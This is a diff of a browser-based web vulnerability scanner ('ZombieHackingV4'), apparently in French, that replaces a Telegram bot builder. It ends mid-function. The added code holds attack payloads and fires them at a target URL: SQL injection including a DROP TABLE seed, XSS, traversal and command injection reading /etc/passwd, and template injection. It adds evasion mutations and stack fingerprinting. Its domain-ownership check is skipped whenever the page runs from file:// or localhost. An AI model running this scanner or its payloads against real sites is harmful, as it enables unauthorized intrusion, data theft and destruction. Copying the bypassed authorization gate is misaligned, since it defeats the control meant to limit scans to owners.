+          <div class="stat-n" style="color:var(--red)" id="s-crit">0</div>
+          <div class="stat-l">CRITIQUES</div>
+        </div>
+        <div class="stat">
+          <div class="stat-n" style="color:var(--purple)" id="s-hybrid">0</div>
+          <div class="stat-l">HYBRIDES</div>
+        </div>
+        <div class="stat">
+          <div class="stat-n" style="color:var(--acc)" id="s-explored">0</div>
+          <div class="stat-l">EXPLORÉS</div>
+        </div>
       </div>
-      <div class="function-desc">Reply to non-command messages</div>
-      <div class="expandable-content">
-        <textarea id="msg-autoreply" placeholder="Auto-reply message">Got your message: "{text}"</textarea>
-        <div class="hint" style="margin-top:0.5rem">Use {text} for user's message</div>
+
+      <div class="card">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px">
+          <div class="card-title" style="margin:0;flex:1">Résultats</div>
+          <button class="btn btn-ghost btn-sm" id="btn-export">📥 JSON</button>
+          <button class="btn btn-danger btn-sm" id="btn-clear-findings">🗑 Vider</button>
+        </div>
+        <div style="overflow-x:auto">
+          <table class="tbl">
+            <thead>
+              <tr>
+                <th>FAMILLE</th><th>PAYLOAD</th><th>SIGNATURE</th>
+                <th>URL</th><th>ORIGINE</th><th>DATE</th>
+              </tr>
+            </thead>
+            <tbody id="findings-body"></tbody>
+          </table>
+        </div>
       </div>
     </div>
 
-    <!-- /ping -->
-    <div class="function-card" data-func="ping">
-      <div class="function-header">
-        <div class="function-name">/ping command</div>
-        <label class="toggle">
-          <input type="checkbox" checked data-toggle="ping">
-          <span class="toggle-slider"></span>
-        </label>
+    <!-- PAGE: DNA -->
+    <div class="page" id="page-dna">
+      <div class="page-title">Attack DNA</div>
+      <div class="page-desc">RÈGLES GÉNÉRALES · MUTATIONS TYPE-AWARE · COMBOS CALCULÉS AUTOMATIQUEMENT</div>
+
+      <div class="card">
+        <div class="card-title">Familles d'attaque</div>
+        <div class="dna-grid" id="dna-grid"></div>
       </div>
-      <div class="function-desc">Check if bot is responsive</div>
-      <div class="expandable-content open">
-        <textarea id="msg-ping" placeholder="Ping response">Pong! Bot is alive and running.</textarea>
+
+      <div class="card">
+        <div class="card-title">Combos valides (calculés par intersection de surfaces)</div>
+        <div id="combos-display" style="font-size:.78rem;line-height:2.2"></div>
+      </div>
+
+      <div class="card">
+        <div class="card-title">Règles de mutation par type de données</div>
+        <div id="mutation-display"></div>
       </div>
     </div>
-  </div>
 
-  <!-- Deploy button -->
-  <button class="btn btn-primary" id="btn-deploy" onclick="deployBot()">
-    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-      <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/>
-    </svg>
-    Deploy to Cloudflare
-  </button>
+    <!-- PAGE: MEMORY -->
+    <div class="page" id="page-memory">
+      <div class="page-title">Mémoire partagée</div>
+      <div class="page-desc">INDEXEDDB · MULTI-PROJETS · DNA ÉVOLUTIF · PATTERNS APPRIS</div>
 
-  <!-- Generated code preview -->
-  <div class="section" id="code-preview" style="display:none;">
-    <div class="section-title">Generated Worker Code</div>
-    <div class="code-block" id="code-display"></div>
-    <button class="btn btn-secondary" onclick="copyCode()" style="margin-top:1rem">
-      Copy Code
-    </button>
-  </div>
+      <div class="stats-row" style="grid-template-columns:repeat(3,1fr)">
+        <div class="stat">
+          <div class="stat-n" style="color:var(--acc2)" id="m-findings">0</div>
+          <div class="stat-l">FAILLES</div>
+        </div>
+        <div class="stat">
+          <div class="stat-n" style="color:var(--acc)" id="m-explored">0</div>
+          <div class="stat-l">VECTEURS EXPLORÉS</div>
+        </div>
+        <div class="stat">
+          <div class="stat-n" style="color:var(--purple)" id="m-learned">0</div>
+          <div class="stat-l">PATTERNS APPRIS</div>
+        </div>
+      </div>
 
+      <div class="card">
+        <div class="card-title">Patterns appris par stack (DNA évolutif)</div>
+        <div id="learned-display" style="font-size:.78rem;color:var(--muted)">
+          Aucun pattern appris — lancez des scans.
+        </div>
+      </div>
+
+      <div style="display:flex;gap:10px">
+        <button class="btn btn-ghost btn-sm" id="btn-refresh-mem">🔄 Rafraîchir</button>
+        <button class="btn btn-danger btn-sm" id="btn-clear-all">🗑 Vider toute la mémoire</button>
+      </div>
+    </div>
+
+  </main>
 </div>
 
+<div id="toast"></div>
+
 <script>
-// ================================================================
-// STATE
-// ================================================================
+// ???????????????????????????????????????????????????????????
+//  NOTE: Script classique (pas type=module) pour que les
+//  fonctions soient accessibles partout sans binding manuel
+//  Toute la logique est dans un IIFE pour eviter pollution
+//  globale tout en permettant les event listeners inline.
+// ???????????????????????????????????????????????????????????
+(async function() {
 
-let config = {
-  telegramToken: '',
-  cfToken: '',
-  cfAccount: '',
-  workerName: 'telegram-bot',
-  functions: {}
-};
+// ?? IndexedDB ?????????????????????????????????????????????
+const DB_NAME = 'ZombieHackingV4';
+let db;
 
-// ================================================================
-// TOGGLE EXPANDABLES
-// ================================================================
-
-document.querySelectorAll('[data-toggle]').forEach(toggle => {
-  toggle.addEventListener('change', (e) => {
-    const func = e.target.dataset.toggle;
-    const card = document.querySelector(`[data-func="${func}"]`);
-    const content = card.querySelector('.expandable-content');
-    
-    if (e.target.checked) {
-      content.classList.add('open');
-      card.classList.add('active');
-    } else {
-      content.classList.remove('open');
-      card.classList.remove('active');
-    }
+async function openDB() {
+  return new Promise((resolve, reject) => {
+    const req = indexedDB.open(DB_NAME, 1);
+    req.onupgradeneeded = e => {
+      const d = e.target.result;
+      ['projects','findings','explored','keys','dna_learned']
+        .forEach(s => { if (!d.objectStoreNames.contains(s)) d.createObjectStore(s, {keyPath:'id'}) });
+    };
+    req.onsuccess = e => resolve(e.target.result);
+    req.onerror   = e => reject(e.target.error);
   });
-});
-
-// ================================================================
-// GENERATE WORKER CODE
-// ================================================================
-
-function generateWorkerCode() {
-  const token = document.getElementById('telegram-token').value;
-  const functions = {};
-  
-  document.querySelectorAll('[data-toggle]').forEach(toggle => {
-    if (toggle.checked) {
-      const func = toggle.dataset.toggle;
-      const msgId = `msg-${func}`;
-      functions[func] = document.getElementById(msgId)?.value || '';
-    }
-  });
-
-  return `// Generated by Telegram Bot Builder
-// Deploy to Cloudflare Workers
-
-const TELEGRAM_TOKEN = '${token}';
-const API = \`https://api.telegram.org/bot\${TELEGRAM_TOKEN}\`;
-
-const FUNCTIONS = ${JSON.stringify(functions, null, 2)};
-
-export default {
-  async fetch(request) {
-    if (request.method !== 'POST') {
-      return new Response('OK', { status: 200 });
-    }
-
-    try {
-      const update = await request.json();
-      await handleUpdate(update);
-    } catch (e) {
-      console.error('Error:', e);
-    }
-
-    return new Response('OK', { status: 200 });
-  }
-};
-
-async function handleUpdate(update) {
-  const message = update.message;
-  if (!message) return;
-
-  const chatId = message.chat.id;
-  const text = message.text || '';
-  const newMember = message.new_chat_member;
-
-  // Welcome new member
-  if (newMember && FUNCTIONS.welcome) {
-    const name = newMember.first_name || 'User';
-    const msg = FUNCTIONS.welcome.replace('{name}', name);
-    await sendMessage(chatId, msg);
-    return;
-  }
-
-  // Commands
-  if (text.startsWith('/')) {
-    const cmd = text.split(' ')[0].toLowerCase().slice(1);
-    if (FUNCTIONS[cmd]) {
-      await sendMessage(chatId, FUNCTIONS[cmd]);
-      return;
-    }
-  }
-
-  // Auto-reply
-  if (FUNCTIONS.autoreply) {
-    const msg = FUNCTIONS.autoreply.replace('{text}', text);
-    await sendMessage(chatId, msg);
-  }
 }
-
-async function sendMessage(chatId, text) {
-  await fetch(\`\${API}/sendMessage\`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: chatId, text })
+function idb(store, mode, fn) {
+  return new Promise((res, rej) => {
+    const tx = db.transaction(store, mode);
+    tx.onerror = e => rej(e.target.error);
+    fn(tx.objectStore(store), res, rej);
   });
-}`;
 }
+const dbPut    = (s,v)   => idb(s,'readwrite',(st,r)=>{st.put(v).onsuccess=r});
+const dbGet    = (s,k)   => idb(s,'readonly', (st,r)=>{const q=st.get(k);q.onsuccess=()=>r(q.result)});
+const dbGetAll = (s)     => idb(s,'readonly', (st,r)=>{const q=st.getAll();q.onsuccess=()=>r(q.result)});
+const dbClear  = (s)     => idb(s,'readwrite',(st,r)=>{st.clear().onsuccess=r});
 
-// ================================================================
-// DEPLOY
-// ================================================================
-
-async function deployBot() {
-  const btn = document.getElementById('btn-deploy');
-  const status = document.getElementById('status-banner');
-  
-  // Validate
-  const telegramToken = document.getElementById('telegram-token').value.trim();
-  const cfToken = document.getElementById('cf-token').value.trim();
-  const cfAccount = document.getElementById('cf-account').value.trim();
-  const workerName = document.getElementById('worker-name').value.trim();
-
-  if (!telegramToken || !cfToken || !cfAccount) {
-    showStatus('warning', 'Please fill in all required credentials.');
-    return;
-  }
-
-  // Generate code
-  const workerCode = generateWorkerCode();
-
-  // Show code preview
-  document.getElementById('code-display').textContent = workerCode;
-  document.getElementById('code-preview').style.display = 'block';
-
-  // Deploy
-  btn.disabled = true;
-  btn.innerHTML = '<div class="spinner"></div> Deploying...';
-  
-  showStatus('info', 'Deploying to Cloudflare Workers...');
-  updateStep(2);
-
+// ?? Web Crypto ????????????????????????????????????????????
+async function genKeyPair() {
+  return crypto.subtle.generateKey(
+    {name:'RSASSA-PKCS1-v1_5',modulusLength:2048,publicExponent:new Uint8Array([1,0,1]),hash:'SHA-256'},
+    true, ['sign','verify']
+  );
+}
+async function exportPub(key) {
+  const raw = await crypto.subtle.exportKey('spki', key);
+  const b64 = btoa(String.fromCharCode(...new Uint8Array(raw)));
+  return '-----BEGIN PUBLIC KEY-----\n'+b64.match(/.{1,64}/g).join('\n')+'\n-----END PUBLIC KEY-----';
+}
+async function sign(privKey, data) {
+  const enc = new TextEncoder().encode(data);
+  const sig = await crypto.subtle.sign('RSASSA-PKCS1-v1_5', privKey, enc);
+  return btoa(String.fromCharCode(...new Uint8Array(sig)));
+}
+async function verify(pubPem, data, sig64) {
   try {
-    // Upload worker
-    const uploadRes = await fetch(
-      `https://api.cloudflare.com/client/v4/accounts/${cfAccount}/workers/scripts/${workerName}`,
-      {
-        method: 'PUT',
-        headers: {
-          'Authorization': `Bearer ${cfToken}`,
-          'Content-Type': 'application/javascript'
-        },
-        body: workerCode
-      }
-    );
+    const b64 = pubPem.replace(/-----[^-]+-----/g,'').replace(/\s/g,'');
+    const raw = Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
+    const key = await crypto.subtle.importKey('spki',raw.buffer,
+      {name:'RSASSA-PKCS1-v1_5',hash:'SHA-256'},false,['verify']);
+    const enc = new TextEncoder().encode(data);
+    const sig = Uint8Array.from(atob(sig64),c=>c.charCodeAt(0));
+    return crypto.subtle.verify('RSASSA-PKCS1-v1_5',key,sig,enc);
+  } catch { return false; }
+}
+async function importPriv(b64) {
+  const raw = Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
+  return crypto.subtle.importKey('pkcs8',raw.buffer,
+    {name:'RSASSA-PKCS1-v1_5',hash:'SHA-256'},false,['sign']);
+}
 
-    if (!uploadRes.ok) {
-      const err = await uploadRes.json();
-      throw new Error(err.errors?.[0]?.message || 'Deploy failed');
+// ?? ATTACK DNA ????????????????????????????????????????????
+const MUTATION_RULES = {
+  string_unfiltered: [
+    {name:'sql_comment',   fn:p=>p.replace(/ /g,'/**/')},
+    {name:'case_flip',     fn:p=>p.split('').map((c,i)=>i%2?c.toUpperCase():c.toLowerCase()).join('')},
+    {name:'null_byte',     fn:p=>p+'%00'},
+    {name:'comment_alt',   fn:p=>p+' -- -'},
+    {name:'double_encode', fn:p=>p.replace(/'/g,'%2527')},
+    {name:'hex_encode',    fn:p=>p.replace(/'/g,'0x27')},
+  ],
+  file_path: [
+    {name:'url_encode',    fn:p=>p.replace(/\//g,'%2f')},
+    {name:'double_dots',   fn:p=>p.replace(/\.\.\//g,'....///')},
+    {name:'null_byte',     fn:p=>p+'%00'},
+    {name:'double_enc',    fn:p=>p.replace(/\//g,'%252f')},
+    {name:'win_sep',       fn:p=>p.replace(/\//g,'\\')},
+  ],
+  html_content: [
+    {name:'tag_upper',     fn:p=>p.replace(/<(\w+)/g,(_,t)=>'<'+t.toUpperCase())},
+    {name:'attr_encode',   fn:p=>p.replace(/=/g,'&#61;')},
+    {name:'svg_wrap',      fn:p=>`<svg><desc>${p}</desc></svg>`},
+    {name:'tmpl_curly',    fn:p=>`{{${p}}}`},
+    {name:'img_err',       fn:p=>`<img src=x onerror="${p}">`},
+    {name:'event_alt',     fn:p=>p.replace('onerror','onmouseover')},
+  ],
+  shell_argument: [
+    {name:'semicolon',     fn:p=>p.replace('&&',';')},
+    {name:'backtick',      fn:p=>'`'+p.trim().split(' ').pop()+'`'},
+    {name:'dollar_exec',   fn:p=>'$('+p.trim().split(' ').pop()+')'},
+    {name:'newline',       fn:p=>p+'\nid'},
+    {name:'tab_sep',       fn:p=>p.replace(/ /g,'\t')},
+  ],
+  integer: [
+    {name:'negative',      fn:p=>'-'+p},
+    {name:'overflow',      fn:_=>'2147483648'},
+    {name:'zero',          fn:_=>'0'},
+    {name:'float',         fn:p=>p+'.0'},
+    // < Pas de commentaires SQL ici - invalide pour un entier
+  ],
+  regex_input: [
+    {name:'redos_basic',   fn:_=>'a'.repeat(30)+'X'},
+    {name:'redos_nested',  fn:_=>'(a+)+'.repeat(4)+'b'},
+    {name:'catastrophic',  fn:_=>'a?'.repeat(20)+'a'.repeat(20)},
+  ],
+};
+
+// Stack signatures pour prioriser les familles
+const STACK_SIGNATURES = {
+  php:    {headers:['x-powered-by: php'],      cookies:['phpsessid'], priority:['sqli','traversal','cmdi','xxe']},
+  node:   {headers:['x-powered-by: express'],  cookies:['connect.sid'],priority:['xss','ssti','prototype_pollution','redos']},
+  python: {headers:['server: gunicorn','server: waitress','server: werkzeug'], cookies:[], priority:['ssti','sqli','cmdi','deserialization']},
+  java:   {headers:['x-powered-by: servlet'],  cookies:['jsessionid'], priority:['xxe','sqli','deserialization','ldap']},
+  ruby:   {headers:['server: thin','x-powered-by: phusion'],cookies:['_session_id'],priority:['sqli','deserialization','ssti']},
+  nginx:  {headers:['server: nginx'],           cookies:[],             priority:['sqli','xss','traversal','cmdi']},
+  apache: {headers:['server: apache'],          cookies:[],             priority:['sqli','traversal','xss','cmdi']},
+};
+
+const ATTACK_DNA = {
+  sqli: {
+    name:'SQL Injection', color:'#ff2d55', severity:'critical',
+    targets:['string_unfiltered'],
+    surfaces:['get_param','post_param','json_body'],
+    mutation_pool:'string_unfiltered',
+    signatures:['data_leak','error_crash','auth_bypass'],
+    incompatible:['integer','file_path','html_content'],
+    affinity:['idor','ssti'],
+    seeds:[
+      {value:"' OR 1=1--",                 param:'username', endpoint:'/login'},
+      {value:"admin'--",                   param:'username', endpoint:'/login'},
+      {value:"' UNION SELECT null,null--",  param:'username', endpoint:'/login'},
+      {value:"'; DROP TABLE users--",       param:'username', endpoint:'/login'},
+      {value:"' AND SLEEP(3)--",            param:'username', endpoint:'/login'},
+    ],
+  },
+  xss: {
+    name:'Cross-Site Scripting', color:'#ff9500', severity:'high',
+    targets:['html_content','string_unfiltered'],
+    surfaces:['get_param','post_param'],
+    mutation_pool:'html_content',
+    signatures:['reflection'],
+    incompatible:['integer','file_path','shell_argument'],
+    affinity:['ssti'],
+    seeds:[
+      {value:'<script>alert(1)</script>',    param:'q', endpoint:'/search'},
+      {value:'<img src=x onerror=alert(1)>', param:'q', endpoint:'/search'},
+      {value:'<svg onload=alert(1)>',        param:'q', endpoint:'/search'},
+      {value:'javascript:alert(1)',          param:'q', endpoint:'/search'},
+    ],
+  },
+  traversal: {
+    name:'Path Traversal', color:'#00e5ff', severity:'high',
+    targets:['file_path'],
+    surfaces:['get_param','post_param'],
+    mutation_pool:'file_path',
+    signatures:['data_leak','size_anomaly'],
+    incompatible:['string_unfiltered','html_content','shell_argument','integer'],
+    affinity:['cmdi','lfi'],
+    seeds:[
+      {value:'../secret.txt',          param:'name', endpoint:'/file'},
+      {value:'../../secret.txt',       param:'name', endpoint:'/file'},
+      {value:'../../../etc/passwd',    param:'name', endpoint:'/file'},
+      {value:'....//....//etc/passwd', param:'name', endpoint:'/file'},
+    ],
+  },
+  cmdi: {
+    name:'Command Injection', color:'#ff2d55', severity:'critical',
+    targets:['shell_argument'],
+    surfaces:['get_param','post_param'],
+    mutation_pool:'shell_argument',
+    signatures:['data_leak','error_crash'],
+    incompatible:['html_content','integer','file_path'],
+    affinity:['traversal'],
+    seeds:[
+      {value:'127.0.0.1; id',               param:'host', endpoint:'/ping'},
+      {value:'127.0.0.1 && whoami',          param:'host', endpoint:'/ping'},
+      {value:'127.0.0.1 | cat /etc/passwd',  param:'host', endpoint:'/ping'},
+      {value:'`id`',                         param:'host', endpoint:'/ping'},
+      {value:'$(whoami)',                    param:'host', endpoint:'/ping'},
+    ],
+  },
+  idor: {
+    name:'IDOR', color:'#00ff99', severity:'high',
+    targets:['integer'],
+    surfaces:['get_param','path_segment'],
+    mutation_pool:'integer',
+    signatures:['data_leak','auth_bypass'],
+    incompatible:['html_content','shell_argument','file_path'],
+    affinity:['sqli'],
+    seeds:[
+      {value:'1',  param:'id', endpoint:'/user/1'},
+      {value:'2',  param:'id', endpoint:'/user/2'},
+      {value:'0',  param:'id', endpoint:'/user/0'},
+      {value:'-1', param:'id', endpoint:'/user/-1'},
+    ],
+  },
+  ssti: {
+    name:'Template Injection', color:'#bf5af2', severity:'critical',
+    targets:['string_unfiltered','html_content'],
+    surfaces:['get_param','post_param'],
+    mutation_pool:'html_content',
+    signatures:['reflection','error_crash','data_leak'],
+    incompatible:['integer','file_path','shell_argument'],
+    affinity:['xss','cmdi'],
+    seeds:[
+      {value:'{{7*7}}',    param:'q', endpoint:'/search'},
+      {value:'${7*7}',     param:'q', endpoint:'/search'},
+      {value:'#{7*7}',     param:'q', endpoint:'/search'},
+      {value:'<%= 7*7 %>', param:'q', endpoint:'/search'},
+      {value:'{{config}}', param:'q', endpoint:'/search'},
+    ],
+  },
+  redos: {
+    name:'ReDoS', color:'#ff9500', severity:'medium',
+    targets:['regex_input','string_unfiltered'],
+    surfaces:['get_param','post_param'],
+    mutation_pool:'regex_input',
+    signatures:['timing_anomaly','error_crash'],
+    incompatible:['html_content','file_path','shell_argument'],
+    affinity:[],
+    seeds:[
+      {value:'a'.repeat(40)+'X',        param:'q', endpoint:'/search'},
+      {value:'(a+)+'.repeat(4)+'b',     param:'q', endpoint:'/search'},
+      {value:'a?'.repeat(25)+'a'.repeat(25), param:'q', endpoint:'/search'},
+    ],
+  },
+};
+
+// ?? Compute combos automatically ??????????????????????????
+function computeCombos() {
+  const ids = Object.keys(ATTACK_DNA);
+  const combos = [];
+  for (let i=0; i<ids.length; i++) {
+    for (let j=i+1; j<ids.length; j++) {
+      const a1=ATTACK_DNA[ids[i]], a2=ATTACK_DNA[ids[j]];
+      const shared=a1.surfaces.filter(s=>a2.surfaces.includes(s));
+      if (!shared.length) continue;
+      const cross = a1.incompatible?.some(t=>a2.targets.includes(t)) ||
+                    a2.incompatible?.some(t=>a1.targets.includes(t));
+      if (!cross) combos.push({a1:ids[i], a2:ids[j], shared});
     }
+  }
+  return combos;
+}
 
-    updateStep(3);
-    showStatus('info', 'Setting webhook...');
+// ?? Success signatures ????????????????????????????????????
+const SIG_CHECKS = {
+  data_leak:     (text,_,__)  => ['admin','root:','password','secret','CONFIDENTIEL','username','daemon:','bin/bash'].some(k=>text.includes(k)),
+  error_crash:   (_,status,__) => status>=500,
+  reflection:    (text,_,pay) => pay.length>3 && text.includes(pay.slice(0,10)),
+  auth_bypass:   (text,status,__)=> status===200 && text.length>20,
+  size_anomaly:  (text,status,__)=> status===200 && text.length>50,
+  timing_anomaly:(_,__,___,ms) => ms>2500,
+};
 
-    // Set webhook
-    const webhookUrl = `https://${workerName}.${cfAccount}.workers.dev`;
-    const webhookRes = await fetch(
-      `https://api.telegram.org/bot${telegramToken}/setWebhook`,
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ url: webhookUrl })
+function evalSigs(sigs, text, status, payload, ms=0) {
+  return sigs.filter(s=>SIG_CHECKS[s]?.(text,status,payload,ms));
+}
+
+// ?? Stack detection ???????????????????????????????????????
+async function detectStack(baseUrl) {
+  try {
+    const t0  = Date.now();
+    const res = await fetchSafe(baseUrl);
+    const ms  = Date.now()-t0;
+    if (!res) return {name:'unknown', priority:Object.keys(ATTACK_DNA), headers:{}, ms};
+
+    const headers = {};
+    res.headers.forEach((v,k)=>{ headers[k.toLowerCase()]=v.toLowerCase(); });
+
+    for (const [stack, sig] of Object.entries(STACK_SIGNATURES)) {
+      const headerMatch = sig.headers.some(h=>{
+        const [k,v] = h.split(': ');
+        return headers[k]?.includes(v);
+      });
+      const cookieMatch = sig.cookies.some(c=>
+        (headers['set-cookie']||'').toLowerCase().includes(c)
+      );
+      if (headerMatch || cookieMatch) {
+        return {name:stack, priority:sig.priority, headers, ms};
       }
-    );
-
-    const webhookData = await webhookRes.json();
-    if (!webhookData.ok) {
-      throw new Error(webhookData.description || 'Webhook failed');
     }
-
-    // Success
-    showStatus('success', `✅ Bot deployed! Live at: ${webhookUrl}`);
-    btn.innerHTML = '✅ Deployed Successfully';
-    
-  } catch (e) {
-    showStatus('warning', `Deployment failed: ${e.message}`);
-    btn.disabled = false;
-    btn.innerHTML = 'Retry Deploy';
+    return {name:'unknown', priority:Object.keys(ATTACK_DNA), headers, ms};
+  } catch {
+    return {name:'unknown', priority:Object.keys(ATTACK_DNA), headers:{}, ms:0};
   }
 }
 
-function showStatus(type, message) {
-  const banner = document.getElementById('status-banner');
-  banner.className = `status-banner ${type}`;
-  banner.innerHTML = `
-    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-      ${type === 'success' ? '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>' :
-        type === 'warning' ? '<path d="m10.29 3.86-7.72 13a2 2 0 0 0 1.71 3h15.43a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>' :
-        '<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>'}
-    </svg>
-    <div>${message}</div>
+// ?? HTTP helpers ??????????????????????????????????????????
+async function fetchSafe(url, opts={}, timeoutMs=5000) {
+  const ctrl = new AbortController();
+  const tid  = setTimeout(()=>ctrl.abort(), timeoutMs);
+  try {
+    const r = await fetch(url, {...opts, signal:ctrl.signal});
+    clearTimeout(tid);
+    return r;
+  } catch {
+    clearTimeout(tid);
+    return null;
+  }
+}
+
+async function probe(baseUrl, seed) {
+  const url = new URL(seed.endpoint, baseUrl);
+  // For path-based endpoints (IDOR): value already in the path (e.g. /user/1)
+  // For param-based endpoints: inject via searchParams
+  const isPathBased = seed.endpoint.match(/\/\d+$|\/[^/]*\d[^/]*$/) !== null;
+  if (!isPathBased) {
+    url.searchParams.set(seed.param, seed.value);
+  }
+  const t0  = Date.now();
+  const res = await fetchSafe(url.toString(), {mode:'cors'}, 6000);
+  const ms  = Date.now()-t0;
+  if (!res) return null;
+  let text='';
+  try { text = await res.text(); } catch {}
+  return {res, text, ms, url:url.toString()};
+}
+
+// ?? State ?????????????????????????????????????????????????
+let currentProj = null;
+let scanning    = false;
+let stopFlag    = false;
+let detectedStack = null;
+
+// ?? Navigation ????????????????????????????????????????????
+function navigate(page) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.getElementById('page-'+page).classList.add('active');
+  document.querySelector(`.nav-item[data-page="${page}"]`).classList.add('active');
+}
+
+// ?? Toast ?????????????????????????????????????????????????
+function toast(msg, type='ok') {
+  const el=document.getElementById('toast');
+  el.textContent=msg;
+  const colors={ok:'var(--acc2)',err:'var(--red)',warn:'var(--orange)'};
+  el.style.borderColor=colors[type]||colors.ok;
+  el.classList.add('show');
+  setTimeout(()=>el.classList.remove('show'),3000);
+}
+
+// ?? Terminal log ??????????????????????????????????????????
+function log(msg, type='info') {
+  const el=document.getElementById('scan-log');
+  if (!el) return;
+  const ts = new Date().toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  const sp = document.createElement('span');
+  sp.className=`tl t-${type}`;
+  sp.textContent=`[${ts}] ${msg}`;
+  el.appendChild(sp);
+  el.scrollTop=el.scrollHeight;
+}
+
+function setProgress(pct) {
+  const el=document.getElementById('prog');
+  if (el) el.style.width=Math.min(100,pct)+'%';
+}
+
+// ?? Projects ??????????????????????????????????????????????
+async function createProject() {
+  const url  = document.getElementById('new-url').value.trim();
+  const name = document.getElementById('new-name').value.trim();
+  if (!url) { toast('URL requise','warn'); return; }
+  let domain;
+  try { domain = new URL(url).hostname; }
+  catch { toast('URL invalide','err'); return; }
+
+  // Generate RSA keypair
+  const kp      = await genKeyPair();
+  const pubPem  = await exportPub(kp.publicKey);
+  const issued  = new Date().toISOString();
+  const origin  = window.location.origin||'file://';
+  const sigData = `${domain}|${issued}|${origin}`;
+  const sig64   = await sign(kp.privateKey, sigData);
+
+  // Store private key
+  const privRaw = await crypto.subtle.exportKey('pkcs8', kp.privateKey);
+  const privB64 = btoa(String.fromCharCode(...new Uint8Array(privRaw)));
+
+  const pp = {
+    version:'1.0', domain, issued_at:issued,
+    expires_at:new Date(Date.now()+365*86400000).toISOString(),
+    html_origin:origin, pubkey:pubPem, signature:sig64,
+    scan_config:{rate_limit_ms:300, excluded_paths:[]},
+  };
+
+  const proj = {
+    id:'proj_'+Date.now(),
+    url, domain, name:name||domain,
+    pp, verified:false,
+    created:issued, scan_count:0,
+  };
+
+  await dbPut('keys',    {id:domain, privKey:privB64});
+  await dbPut('projects', proj);
+
+  toast('Projet cree');
+  await renderProjects();
+  selectProject(proj.id);
+  navigate('verify');
+}
+
+async function renderProjects() {
+  const projects = await dbGetAll('projects');
+  const el = document.getElementById('project-list');
+  if (!projects.length) {
+    el.innerHTML='<p style="color:var(--muted);font-size:.78rem">Aucun projet - creez-en un.</p>';
+    return;
+  }
+  el.innerHTML = projects.map(p=>`
+    <div class="proj-item ${currentProj?.id===p.id?'selected':''}"
+         data-id="${p.id}" style="cursor:pointer">
+      <span>${p.verified?'[OK]':'[lock]'}</span>
+      <div style="flex:1">
+        <div class="proj-domain">${esc(p.name)}</div>
+        <div class="proj-meta">${esc(p.domain)} ? Scans: ${p.scan_count}</div>
+      </div>
+      <span class="badge ${p.verified?'badge-ok':'badge-warn'}">${p.verified?'VERIFIE':'EN ATTENTE'}</span>
+    </div>
+  `).join('');
+
+  // Bind clicks
+  el.querySelectorAll('.proj-item').forEach(item=>{
+    item.addEventListener('click', ()=>selectProject(item.dataset.id));
+  });
+}
+
+async function selectProject(id) {
+  currentProj = await dbGet('projects', id);
+  await renderProjects();
+  updateVerifyUI();
+  updateScanUI();
+}
+
+// ?? Verify ????????????????????????????????????????????????
+function updateVerifyUI() {
+  const p = currentProj;
+  document.getElementById('verify-no-proj').style.display  = p?'none':'block';
+  document.getElementById('verify-content').style.display  = p?'block':'none';
+  if (!p) return;
+  const ppPath = `${p.url}/.well-known/zombiehack.pp`;
+  document.getElementById('pp-path-display').textContent = ppPath;
+  document.getElementById('pp-preview').textContent = JSON.stringify(p.pp,null,2);
+  // Update step indicators
+  document.getElementById('step1-n').className = 'step-n';
+  document.getElementById('step2-n').className = 'step-n';
+  document.getElementById('step3-n').className = p.verified?'step-n done':'step-n';
+}
+
+function downloadPP() {
+  if (!currentProj) return;
+  const blob=new Blob([JSON.stringify(currentProj.pp,null,2)],{type:'application/json'});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob); a.download='zombiehack.pp'; a.click();
+  document.getElementById('step1-n').className='step-n done';
+}
+
+async function verifyOwnership() {
+  if (!currentProj) return;
+  const result=document.getElementById('verify-result');
+  result.innerHTML='<span class="spin"></span>';
+
+  // Dev/local mode bypass
+  const isLocal = ['localhost','127.0.0.1',''].includes(location.hostname) || location.protocol==='file:';
+  if (isLocal) {
+    currentProj.verified=true;
+    await dbPut('projects',currentProj);
+    result.innerHTML='<span class="badge badge-warn">[!] MODE LOCAL - verifie automatiquement</span>';
+    document.getElementById('step3-n').className='step-n done';
+    await renderProjects();
+    updateScanUI();
+    toast('Mode local - scan autorise','warn');
+    return;
+  }
+
+  const ppUrl=`${currentProj.url}/.well-known/zombiehack.pp`;
+  try {
+    const res=await fetchSafe(ppUrl,{},8000);
+    if (!res||!res.ok) throw new Error('HTTP '+(res?.status||'unreachable'));
+    const fetched=await res.json();
+
+    const sigData=`${fetched.domain}|${fetched.issued_at}|${fetched.html_origin}`;
+    const sigOk     = await verify(fetched.pubkey, sigData, fetched.signature);
+    const originOk  = fetched.html_origin===(window.location.origin||'file://');
+    const domainOk  = fetched.domain===currentProj.domain;
+
+    if (sigOk && originOk && domainOk) {
+      currentProj.verified=true;
+      await dbPut('projects',currentProj);
+      result.innerHTML='<span class="badge badge-ok">[OK] PROPRIETE CONFIRMEE</span>';
+      document.getElementById('step3-n').className='step-n done';
+      await renderProjects();
+      updateScanUI();
+      toast('Domaine verifie');
+    } else {
+      const why=!sigOk?'Signature invalide':!originOk?'html_origin mismatch':'Domaine mismatch';
